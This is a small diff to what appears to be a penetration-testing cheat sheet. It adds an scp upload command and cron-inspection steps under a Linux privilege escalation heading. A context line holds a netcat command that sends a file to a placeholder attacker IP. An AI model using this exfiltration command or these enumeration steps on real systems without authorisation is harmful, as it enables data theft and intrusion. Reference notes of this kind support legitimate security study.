@@ -48,6 +48,7 @@ nc <ATTACKER_IP> 5555 < <FILE_NAME>
 
 ```bash
 scp <USER_NAME>@<TARGET_IP>:<FILE_NAME> .
+scp ./* <USER_NAME>@<TARGET_IP>:<FILE_PATH>
 ```
 
 # Linux Privilege Escalation and System Commands
@@ -258,6 +259,10 @@ use
 
 ```bash
 cat /etc/crontab
+```
+
+```bash
+cd /etc/cron.d
 ```
 
 # Online Tools and Resources
